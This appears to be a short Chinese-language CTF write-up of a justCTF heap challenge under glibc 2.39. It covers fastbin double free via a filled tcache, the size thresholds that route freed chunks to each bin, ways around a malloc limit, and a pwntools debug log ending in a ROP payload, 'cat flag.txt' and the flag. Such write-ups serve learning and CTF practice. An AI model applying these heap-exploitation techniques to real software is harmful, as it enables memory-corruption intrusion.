# 知识点

## fastbin double free
在glibc2.39下可以实现fastbin的double free
- tcache fill
- 1->2->1

## 啥时候进入fastbin，啥时候进unsortedbin
### size >= 0x420
直接进unsortedbin

### size < 0x80
tcache满了以后，直接进fastbin

### size >=0x80
tcache满了以后，直接进unsortedbin，本题就用了此特性

## 本次malloc有次数限制
- 要填满tcache首先要7次malloc和7次free，可以修改heap开始的结构体，减少malloc次数
![](https://r2.20161023.xyz/pic/20250804111508397.png)


- 是否malloc到程序0x4040处，在把其全部指针清空？首先要泄漏elf到base地址
# getshell
本地网络延迟大的时候，把`context.log_level = "debug"`注释掉再跑
```
    b'15\n'
[DEBUG] Received 0x9 bytes:
    b'Content? '
[DEBUG] Received 0x9 bytes:
    b'Content? '
[DEBUG] Sent 0x29 bytes:
    00000000  00 75 d2 b4  31 56 00 00  5b c7 f1 02  9d 7f 00 00  │·u··│1V··│[···│····│
    00000010  2f 84 fd 02  9d 7f 00 00  2f 58 e3 02  9d 7f 00 00  │/···│····│/X··│····│
    00000020  50 57 e6 02  9d 7f 00 00  0a                        │PW··│····│·│
    00000029
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[*] Switching to interactive mode
[DEBUG] Received 0x2e bytes:
    b'justCTF{ofc_the_R_in_CRUD_stands_for_ROPchain}'
justCTF{ofc_the_R_in_CRUD_stands_for_ROPchain}$
[DEBUG] Sent 0x1 bytes:
    b'\n'
```

![](https://r2.20161023.xyz/pic/20250804111303835.png)